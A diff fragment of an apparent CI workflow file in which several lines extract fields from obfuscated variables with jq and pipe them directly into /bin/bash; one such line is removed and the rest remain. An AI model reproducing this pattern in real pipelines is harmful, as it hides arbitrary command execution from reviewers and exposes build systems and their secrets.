@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$l87327" | jq -r .cem66911 | /bin/bash
           echo $poi3 | jq -r .sxyf29878 | /bin/bash
           echo $dk7766 | jq -r .a7 | /bin/bash
-          echo $lmvjr1955 | jq -r .rr178 | /bin/bash
           printf '%s' "$weg83982" | jq -r .f40 | /bin/bash
 
       - name: Upload results
